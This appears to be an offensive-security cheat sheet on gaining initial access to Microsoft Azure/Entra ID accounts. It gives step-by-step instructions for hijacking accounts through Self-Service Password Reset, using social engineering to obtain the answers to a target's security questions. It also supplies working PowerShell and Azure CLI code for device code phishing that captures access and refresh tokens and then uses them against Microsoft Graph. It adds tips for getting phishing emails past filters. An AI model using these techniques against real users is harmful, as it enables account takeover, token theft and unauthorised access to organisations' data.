# Initial Access

There are various ways to gain initial access. The primary and least resistant one is social engineer your target either by spear phishing, or a different method.

## Self-Service Password Reset (SSPR) Abuse

### 1) Browse to the URL and input the target's email, then pass the CAPTCHA.

https://aka.ms/sspr

### 2) Click cancel, then repeat the step a few times so that you can find the pattern of the Security Questions

### 3) Conduct social engineering against your target to make him give you somehow the answers to the security questions

### 4) Reset target's password via the SSPR functionality

### 5) Sign-In to "My Apps" to see exactly which services this account can access

https://myapps.microsoft.com/index.htm

OR you can login via CLI

    az login -u USER -p PASSWORD --tenant TENANT_ID

## Device Code Phishing

Resource: https://aadinternals.com/post/phishing/

Azure CLI

### 1) generate device code, then send a phishing email with the device code. Azure CLI handles both the code generation and waiting for the authentication.

    az login --use-device-code

PowerShell

### 1) Request a user and device code (Microsoft Graph resource and MS Office application Client ID are used in the example here)

List of common Microsoft Application IDs: https://learn.microsoft.com/en-us/troubleshoot/entra/entra-id/governance/verify-first-party-apps-sign-in#application-ids-of-commonly-used-microsoft-applications

    $body=@{
        "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
        "resource" =  "https://graph.microsoft.com"
    }
    
    $authResponse=(Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" -Body $body)
    $authResponse

### 2) Create a script that continuously queries the token endpoint and polls for authentication status. Upon successful authentication, it will print our access token and a refresh token is also stored in the variable.

    $response = ""
    $continue = $true
    $interval = $authResponse.interval
    $expires =  $authResponse.expires_in
    
    $body=@{
        "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
        "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
        "code" = $authResponse.device_code
        "resource" = "https://graph.microsoft.com"
    }
    
    while($continue)
    {
        Start-Sleep -Seconds $interval
        $total += $interval
    
        if($total -gt $expires)
        {
            Write-Error "Timeout occurred"
            return
        }
    
        try
        {
            $response = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0 " -Body $body -ErrorAction SilentlyContinue
        }
        catch
        {
            $details=$_.ErrorDetails.Message | ConvertFrom-Json
            $continue = $details.error -eq "authorization_pending"
            Write-Host $details.error
    
            if(!$continue)
            {
                Write-Error $details.error_description
                return
            }
        }
    
        if($response)
        {
          break
        }
    }
    $response.access_token

### 3) Send a spear phishing email to target with the device code in the body

DO NOT USE GMAIL AND OUTLOOK, USE ANOTHER EMAIL CLIENT INSTEAD TO PREVENT BLOCKS!

### 4) Copy the access token and paste it into:

https://jwt.io/

### 5) Use token to authenticate, depending on the type of token.

Microsoft Graph example

    Connect-MgGraph -AccessToken ($response.access_token | ConvertTo-SecureString -AsPlainText -Force)

### 6) Confirm execution context

    Get-MgContext
